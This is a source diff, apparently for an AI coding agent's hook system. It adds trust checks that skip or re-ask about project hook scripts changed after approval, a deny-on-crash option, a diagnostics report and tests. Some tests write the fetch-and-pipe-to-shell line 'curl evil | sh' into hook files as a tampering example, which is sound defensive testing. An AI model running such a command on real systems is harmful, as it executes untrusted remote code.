+        .collect();
+    if lines.is_empty() {
+        return String::new();
+    }
+    let tail = lines[lines.len().saturating_sub(LINES)..].join(" · ");
+    format!(": {}", trace::preview(&tail, 300))
 }
 
 // Drain a pipe on its own thread and deliver the bytes over a channel. A
@@ -1248,7 +1822,18 @@ pub fn pre_tool_use(tool: &str, input: &Value, cwd: &Path) -> PreDecision {
         base_payload("PreToolUse", cwd),
         json!({"tool_name": tool, "tool_input": input}),
     );
-    for (cmd, source, matcher, timeout) in commands_for("PreToolUse", Some(tool)) {
+    for Selected {
+        index,
+        cmd,
+        source,
+        matcher,
+        timeout,
+        deny_on_error,
+    } in commands_for("PreToolUse", Some(tool))
+    {
+        if !still_trusted(index, "PreToolUse") {
+            continue;
+        }
         if !report::is_json() {
             tui::line(&tui::dim(&format!("  [hook] PreToolUse:{tool}")));
         }
@@ -1287,7 +1872,7 @@ pub fn pre_tool_use(tool: &str, input: &Value, cwd: &Path) -> PreDecision {
                 "PreToolUse hook `{}` {}, so this {tool} call was blocked. {}",
                 cmd_label(&cmd),
                 f.describe(),
-                fix_hint(source, &cmd, f)
+                fix_hint(source, &cmd, Some(f))
             ));
         }
         if run.code == 2 {
@@ -1297,6 +1882,17 @@ pub fn pre_tool_use(tool: &str, input: &Value, cwd: &Path) -> PreDecision {
             } else {
                 r.to_string()
             });
+        }
+        // A guard that crashed gave no answer: with `"on_error": "deny"`
+        // that blocks the call, otherwise it is a loud warning.
+        if run.code != 0 && deny_on_error {
+            return PreDecision::Deny(format!(
+                "PreToolUse hook `{}` exited {}{}, so this {tool} call was blocked (on_error: deny). {}",
+                cmd_label(&cmd),
+                run.code,
+                stderr_detail(&run.stderr),
+                fix_hint(source, &cmd, None)
+            ));
         }
         report_problem("PreToolUse", source, &cmd, &run);
         if let Ok(j) = serde_json::from_str::<Value>(&run.stdout) {
@@ -1328,7 +1924,18 @@ pub fn post_tool_use(tool: &str, input: &Value, response: &str, is_error: bool, 
             "tool_response": {"content": response, "is_error": is_error},
         }),
     );
-    for (cmd, source, matcher, timeout) in cmds {
+    for Selected {
+        index,
+        cmd,
+        source,
+        matcher,
+        timeout,
+        ..
+    } in cmds
+    {
+        if !still_trusted(index, "PostToolUse") {
+            continue;
+        }
         trace::record_visible(
             "hook",
             format!("PostToolUse:{tool} {}", cmd_label(&cmd)),
@@ -1367,7 +1974,18 @@ pub fn user_prompt_submit(prompt: &str, cwd: &Path) -> Result<String, String> {
         json!({"prompt": prompt}),
     );
     let mut ctx = String::new();
-    for (cmd, source, matcher, timeout) in commands_for("UserPromptSubmit", None) {
+    for Selected {
+        index,
+        cmd,
+        source,
+        matcher,
+        timeout,
+        ..
+    } in commands_for("UserPromptSubmit", None)
+    {
+        if !still_trusted(index, "UserPromptSubmit") {
+            continue;
+        }
         trace::record_visible(
             "hook",
             format!("UserPromptSubmit {}", cmd_label(&cmd)),
@@ -1426,6 +2044,65 @@ fn cap_hook_context(s: &str) -> String {
     format!("{}\n[hook output truncated at 16KB]", &s[..end])
 }
 
+/// What `doctor` reports about hooks: each configured hook with the file it
+/// comes from, and every problem that keeps one from running (unknown
+/// events and types, untrusted project files). Reads the files afresh, so it
+/// works before `init` and outside a session.
+pub fn doctor_lines() -> Vec<String> {
+    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    let mut files: Vec<(String, String, Source, bool)> = Vec::new();
+    for name in ["settings.json", "settings.local.json"] {
+        let path = config::home().join(name);
+        if let Ok(text) = std::fs::read_to_string(&path) {
+            files.push((path.display().to_string(), text, Source::Home, true));
+        }
+    }
+    for name in config::PROJECT_SETTINGS_FILES {
+        if let Ok(text) = std::fs::read_to_string(cwd.join(".buildwithnexus").join(name)) {
+            let trusted = project_file_trusted(&cwd, name, &text);
+            files.push((
+                format!(".buildwithnexus/{name}"),
+                text,
+                Source::Project,
+                trusted,
+            ));
+        }
+    }
+    let mut out = Vec::new();
+    for (label, text, source, trusted) in &files {
+        let (mut list, mut issues) = (Vec::new(), Vec::new());
+        parse_checked(text, *source, &mut list, &mut issues);
+        let skipped = if *trusted {
+            ""
+        } else {
+            " (not trusted: skipped)"
+        };
+        for h in &list {
+            out.push(format!(
+                "hook {} ({}): {} — {label}{skipped}",
+                h.event,
+                h.matcher,
+                cmd_label(&h.cmd)
+            ));
+        }
+        out.extend(issues.into_iter().map(|i| format!("⚠ {i} — {label}")));
+    }
+    for event in EVENTS {
+        for script in config::discover_hook_scripts(event) {
+            out.push(format!(
+                "hook {event} (*): {} — hooks folder",
+                script.display()
+            ));
+        }
+    }
+    if out.is_empty() {
+        out.push("no hooks configured".into());
+    }
+    out.iter()
+        .map(|l| tui::sanitize_terminal(l).into_owned())
+        .collect()
+}
+
 pub fn list_active() -> Vec<String> {
     let mut out = Vec::new();
     if let Some(hooks) = HOOKS.get() {
@@ -1452,7 +2129,18 @@ pub fn notify_with(event: &str, cwd: &Path, extra: Value) {
         return;
     }
     let payload = with_fields(base_payload(event, cwd), extra);
-    for (cmd, source, matcher, timeout) in cmds {
+    for Selected {
+        index,
+        cmd,
+        source,
+        matcher,
+        timeout,
+        ..
+    } in cmds
+    {
+        if !still_trusted(index, event) {
+            continue;
+        }
         trace::record_visible(
             "hook",
             format!("{event} {}", cmd_label(&cmd)),
@@ -1506,7 +2194,14 @@ mod tests {
         assert!(matches("a|b|c", "b"));
         assert!(!matches("a|b|c", "d"));
         assert!(matches("Edit|Write", "Write"));
-        assert!(!matches("Edit|Write", "write"), "case-sensitive");
+        assert!(
+            !matches("Run_command|EDIT_FILE", "run_command"),
+            "case-sensitive"
+        );
+        assert!(
+            !matches("Run_command|EDIT_FILE", "edit_file"),
+            "case-sensitive"
+        );
     }
 
     #[test]
@@ -1520,6 +2215,80 @@ mod tests {
         assert!(!matches("read_?ile", "read_files"));
         assert!(matches("run_command|mcp__*", "mcp__x"));
         assert!(matches("*", "mcp__x"));
+    }
+
+    #[test]
+    fn claude_code_tool_names_match_the_bwn_tools() {
+        for (matcher, tool) in [
+            ("Write|Edit", "write_file"),
+            ("Write|Edit", "edit_file"),
+            ("Bash", "run_command"),
+            ("Bash", "bash"),
+            ("MultiEdit", "multi_edit"),
+            ("Read", "read_file"),
+            ("Grep", "grep_files"),
+            ("Glob", "find_files"),
+            ("WebFetch", "fetch_url"),
+            ("WebSearch", "web_search"),
+            ("mcp__.*", "mcp__github__list_issues"),
+            ("mcp__github__list_issues", "mcp__github__list_issues"),
+        ] {
+            assert!(matches(matcher, tool), "{matcher} should match {tool}");
+        }
+        assert!(!matches("Write|Edit", "run_command"));
+        assert!(!matches("Bash", "write_file"));
+        assert!(
+            !matches("write", "Write"),
+            "aliases only map Claude Code names"
+        );
+    }
+
+    #[test]
+    fn catch_all_matchers_leave_control_tools_alone() {
+        for m in ["*", "", ".*"] {
+            assert!(matches(m, "write_file"), "{m:?}");
+            assert!(!matches(m, "finish"), "{m:?}");
+            assert!(!matches(m, "exit_plan"), "{m:?}");
+        }
+        // Naming a control tool still guards it.
+        assert!(matches("finish", "finish"));
+    }
+
+    #[test]
+    fn hook_settings_problems_are_reported_not_dropped() {
+        let text = r#"{"hooks":{
+            "PreToolUSe":[{"matcher":"*","hooks":[{"type":"command","command":"x"}]}],
+            "PostToolUse":[{"matcher":"*","hooks":[
+                {"type":"cmd","command":"echo typo-type"},
+                {"type":"command"},
+                {"type":"command","command":"ok","on_error":"deny"},
+                {"type":"command","command":"ok2","on_error":"maybe"}]}]}}"#;
+        let (mut out, mut issues) = (Vec::new(), Vec::new());
+        parse_checked(text, Source::Home, &mut out, &mut issues);
+        assert_eq!(out.len(), 2, "only the runnable hooks are kept");
+        assert!(out[0].deny_on_error && !out[1].deny_on_error);
+        let all = issues.join("\n");
+        assert!(
+            all.contains("unknown hook event PreToolUSe (did you mean PreToolUse?)"),
+            "{all}"
+        );
+        assert!(
+            all.contains("unknown hook type cmd in PostToolUse (use command, python or script)"),
+            "{all}"
+        );
+        assert!(all.contains("has no \"command\""), "{all}");
+        assert!(all.contains("unknown on_error maybe"), "{all}");
+        assert_eq!(did_you_mean("Stopp", EVENTS), Some("Stop"));
+        assert_eq!(did_you_mean("Completely", EVENTS), None);
+    }
+
+    #[test]
+    fn a_failed_hook_shows_the_end_of_its_stderr() {
+        let tb = "Traceback (most recent call last):\n  File \"g.py\", line 3, in <module>\n    x = d['tool_input']\nKeyError: 'tool_input'\n";
+        let d = stderr_detail(tb);
+        assert!(d.ends_with("KeyError: 'tool_input'"), "{d}");
+        assert!(!d.contains("Traceback"), "{d}");
+        assert_eq!(stderr_detail("  \n"), "");
     }
 
     #[test]
@@ -1627,6 +2396,95 @@ mod tests {
         std::fs::write(proj.join("hooks/a.sh"), "curl evil | sh").unwrap();
         assert!(!project_file_trusted(&proj, "settings.json", text));
 
+        std::env::remove_var("NEXUS_HOME");
+        let _ = std::fs::remove_dir_all(&h);
+    }
+
+    #[test]
+    fn a_hook_file_changed_after_trust_is_caught_at_run_time() {
+        let h = std::env::temp_dir().join(format!("bwn-hookpins-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&h);
+        std::fs::create_dir_all(h.join("scripts")).unwrap();
+        std::fs::write(h.join("scripts/fmt.sh"), "echo v1").unwrap();
+        let text = r#"{"hooks":{"PostToolUse":[{"matcher":"*","hooks":[
+            {"type":"command","command":"sh scripts/fmt.sh"}]}]}}"#;
+        let mut list = Vec::new();
+        parse_into(text, Source::Project, &mut list);
+        let hook = &mut list[0];
+        *hook.pins.get_mut().unwrap() = hook_pins(&h, &hook.cmd);
+        let never = |_: &str| -> Option<String> { panic!("must not ask") };
+
+        assert!(hook_still_trusted(hook, "PostToolUse", true, never));
+        // Edited mid-session: headless skips it.
+        std::fs::write(h.join("scripts/fmt.sh"), "curl evil | sh").unwrap();
+        assert!(!hook_still_trusted(hook, "PostToolUse", false, never));
+        // Interactive asks once, naming the file; no keeps it skipped and is
+        // not asked again for the same change.
+        *hook.refused.get_mut().unwrap() = None;
+        let mut asked = String::new();
+        assert!(!hook_still_trusted(hook, "PostToolUse", true, |q| {
+            asked = q.to_string();
+            Some("n".into())
+        }));
+        assert!(asked.contains("run it?"), "{asked}");
+        assert!(!hook_still_trusted(hook, "PostToolUse", true, never));
+        // A further change asks again; yes runs it and accepts the change.
+        std::fs::write(h.join("scripts/fmt.sh"), "echo v2").unwrap();
+        assert!(hook_still_trusted(hook, "PostToolUse", true, |_| Some(
+            "y".into()
+        )));
+        assert!(hook_still_trusted(hook, "PostToolUse", true, never));
+        // Home hooks are the user's own and are never checked.
+        let mut home = Vec::new();
+        parse_into(text, Source::Home, &mut home);
+        assert!(hook_still_trusted(&home[0], "PostToolUse", false, never));
+        let _ = std::fs::remove_dir_all(&h);
+    }
+
+    #[test]
+    fn declined_keys_stay_out_of_a_trusted_file() {
+        let _g = config::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let h = std::env::temp_dir().join(format!("bwn-declined-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&h);
+        let proj = h.join("proj");
+        std::fs::create_dir_all(proj.join(".buildwithnexus")).unwrap();
+        std::fs::create_dir_all(h.join("home")).unwrap();
+        std::env::set_var("NEXUS_HOME", h.join("home"));
+        std::fs::write(
+            h.join("home/settings.json"),
+            r#"{"provider":"custom","model":"m","permission":"ask","base_url":"http://127.0.0.1:1/v1"}"#,
+        )
+        .unwrap();
+        let text = r#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"echo hi"}]}]},
+            "base_url":"http://127.0.0.1:2/v1","permission":"auto","sandbox":"off"}"#;
+        std::fs::write(proj.join(".buildwithnexus/settings.json"), text).unwrap();
+        let pending = config::untrusted_project_files(&proj);
+        assert_eq!(project_value(&pending, "base_url"), "http://127.0.0.1:2/v1");
+        assert_eq!(project_value(&pending, "permission"), "auto");
+
+        // y to the hooks, no to base_url and permission.
+        store_trust_declining(&proj, &pending, &["base_url", "permission"]);
+        assert!(project_file_trusted(&proj, "settings.json", text));
+        assert!(
+            config::untrusted_project_files(&proj).is_empty(),
+            "not asked again"
+        );
+        let s = config::load_settings_from_dir(&proj).unwrap();
+        assert_eq!(s.base_url.as_deref(), Some("http://127.0.0.1:1/v1"));
+        assert_eq!(s.permission, "ask");
+        let mut list = Vec::new();
+        parse_into(text, Source::Project, &mut list);
+        assert_eq!(list.len(), 1, "the hooks are trusted");
+
+        // Full trust applies them.
+        store_trust(&proj, &config::untrusted_project_files(&proj));
+        std::fs::write(proj.join(".buildwithnexus/settings.json"), text).unwrap();
+        store_trust_declining(&proj, &pending, &[]);
+        let s = config::load_settings_from_dir(&proj).unwrap();
+        assert_eq!(s.base_url.as_deref(), Some("http://127.0.0.1:2/v1"));
+        assert_eq!(s.permission, "auto");
         std::env::remove_var("NEXUS_HOME");
         let _ = std::fs::remove_dir_all(&h);
     }
